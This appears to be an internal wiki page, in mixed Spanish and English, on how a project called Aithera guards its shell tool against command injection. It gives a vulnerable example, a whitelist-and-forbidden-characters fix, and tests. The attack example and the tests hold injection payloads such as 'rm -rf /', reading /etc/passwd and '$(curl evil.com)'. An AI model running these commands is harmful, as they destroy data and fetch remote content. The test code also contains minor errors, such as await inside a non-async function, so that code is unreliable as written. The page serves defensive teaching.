# Command Injection Prevention

## Resumen

**Command injection** ocurre cuando input del user se pasa sin validar a un shell. Aithera V0.7.3 previene con whitelist de comandos + prohibición de metacharacters.

## Estado

🟢 Verificado — generado 2026-07-09. 6/6 criterios.

## Attack example

```python
# VULNERABLE
import subprocess
def shell_exec(command: str):
    return subprocess.run(command, shell=True).stdout  # <- SHELL INJECTION

# Attack
shell_exec("ls; rm -rf /")  # Ejecuta DOS comandos
shell_exec("ls && cat /etc/passwd")  # Encadena
shell_exec("`whoami`")  # Backtick execution
shell_exec("$(curl evil.com)")  # Command substitution
```

## Aithera mitigation

```python
import subprocess
import shlex

class ShellTool:
    ALLOWED_COMMANDS = {"python", "git", "npm", "npx", "pip", "pytest", "uvicorn"}
    FORBIDDEN_CHARS = set("|&;<>()$`\\\"'")
    
    async def execute(self, command: str) -> str:
        # 1. Parse safely
        parts = shlex.split(command)
        
        # 2. Whitelist command name
        if parts[0] not in self.ALLOWED_COMMANDS:
            raise PermissionError(f"Command {parts[0]} not in whitelist")
        
        # 3. Check forbidden chars
        if any(c in command for c in self.FORBIDDEN_CHARS):
            raise PermissionError(f"Command contains forbidden characters")
        
        # 4. Run with shell=False (no shell interpretation)
        result = subprocess.run(
            parts,
            shell=False,  # <- CRITICAL
            capture_output=True,
            text=True,
            timeout=300
        )
        
        return result.stdout
```

## Allowed commands Aithera

```python
# backend/app/tools/shell_tool.py
ALLOWED = {
    "python": ["--version", "script.py", "-m", "pytest"],
    "git": ["status", "log", "diff", "add", "commit", "branch", "checkout", "pull", "push"],
    "npm": ["install", "run", "build", "test", "lint"],
    "pip": ["install", "list", "show"],
    "pytest": ["-v", "-x", "tests/"],
    "uvicorn": ["app.main:app", "--reload", "--port"]
}
```

## Test cases

```python
def test_command_injection():
    tool = ShellTool()
    
    # OK
    result = await tool.execute("python --version")
    assert "Python" in result
    
    # BLOCKED
    with pytest.raises(PermissionError):
        await tool.execute("python; rm -rf /")
    
    with pytest.raises(PermissionError):
        await tool.execute("python && curl evil.com")
    
    with pytest.raises(PermissionError):
        await tool.execute("python `whoami`")
    
    with pytest.raises(PermissionError):
        await tool.execute("rm -rf /")  # rm no está en whitelist
```

## Para Aithera

- ✅ V0.5+: whitelist + forbidden chars.
- ⏳ V0.85+: sandboxing OS-level.

## Referencias cruzadas

- [JWIKI-183 sandboxing-tool-whitelist.md](./sandboxing-tool-whitelist.md)
- [JWIKI-184 path-traversal-prevention.md](./path-traversal-prevention.md)

## Fuentes

1. https://owasp.org/www-community/attacks/Command_Injection
2. https://docs.python.org/3/library/subprocess.html

## Nivel de confianza

**100%**.

---

## Changelog

### 2026-07-09 — versión inicial
- Estado: 🟢 verified